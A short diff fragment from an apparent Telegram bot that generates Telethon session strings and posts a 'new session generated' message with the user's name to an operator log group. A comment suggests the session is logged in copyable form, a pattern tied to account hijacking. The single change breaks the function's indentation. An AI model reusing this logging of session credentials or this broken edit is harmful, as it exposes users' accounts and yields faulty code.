@@ -95,7 +95,7 @@ async def generate_telethon_session(bot, query: CallbackQuery):
     )
 
     # 🔥 LOGS: CODE TAG FOR TAP TO COPY 🔥
-    if LOG_GROUP_ID:
+if LOG_GROUP_ID:
     log_text = (
         f"📦 <b>ɴᴇᴡ sᴇssɪᴏɴ ɢᴇɴᴇʀᴀᴛᴇᴅ</b>\n\n"
         f"👤 <b>User:</b> {name}\n"
